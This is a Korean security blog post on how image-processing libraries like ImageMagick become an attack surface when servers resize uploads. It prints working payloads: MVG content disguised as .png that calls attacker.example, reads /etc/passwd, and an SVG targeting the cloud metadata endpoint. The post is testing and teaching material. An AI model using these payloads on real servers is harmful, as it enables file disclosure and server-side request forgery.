---
title: "이미지 처리 라이브러리 위험 (ImageMagick 등)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, File Upload]
tags: [imagemagick, file-processing, ssrf, web]
description: "업로드 이미지를 서버가 변환·리사이즈할 때 형식 혼동·수식·외부 리소스 기능으로 파일 읽기·SSRF·실행이 생기는 처리 라이브러리 위험의 개념과 구문을 정리합니다."
mermaid: true
---

> 업로드 자체는 막아도, 서버가 그 파일을 **변환·리사이즈·썸네일** 처리하는 순간 이미지 라이브러리의 기능이 공격 표면이 된다. 파일이 실행되지 않아도 라이브러리가 파일 내용을 "명령"으로 해석할 수 있다.

## 개념

ImageMagick 같은 라이브러리는 파일 확장자가 아니라 **내용의 매직바이트**로 형식을 판단하고, 일부 형식(MVG·MSL·SVG·PS)은 외부 파일 읽기·URL 접속·수식 기능을 포함한다. 그래서 `.png`로 올려도 내용이 MVG면 그 기능이 실행된다. 처리 라이브러리·버전 식별이 진단의 출발점이다.

```
업로드 .png (내용은 MVG) → 서버가 convert 로 리사이즈 → MVG 명령 실행
```

## 공격·우회 구문

허가된 범위에서만. 영향은 무해한 증거(OAST 콜백·시간 지연)로.

### 라이브러리·버전 식별

```
처리 전후 메타데이터: docProps/app.xml, EXIF Software 태그
응답 이미지의 처리 흔적, 오류 메시지의 라이브러리명
알려진 CVE(예: ImageTragick 계열)가 해당 버전에 있는지
```

### SSRF·파일 읽기 (MVG/MSL)

```
# 확장자는 .png, 내용은 MVG — 외부 URL 접속(SSRF)
push graphic-context
viewbox 0 0 1 1
image over 0,0 0,0 'url(http://attacker.example/x)'
pop graphic-context

# 로컬 파일 읽어 응답 이미지에 포함
image over 0,0 0,0 'label:@/etc/passwd'      # 또는 text:/etc/hosts
```

### SVG 경유 (XXE·SSRF)

```xml
<!-- 업로드 SVG → 처리기가 XML 파싱하면 XXE -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### 확인 요령

```
변환된 결과 이미지에 /etc/passwd 내용·외부 리소스가 섞여 나오는지
처리가 비동기면 OAST 콜백이 수 분 뒤 도착하는지(충분히 대기)
정책 파일(policy.xml)로 위험 코더가 비활성인지
```

## 참고 자료

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [ImageMagick Security Policy](https://imagemagick.org/script/security-policy.php)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
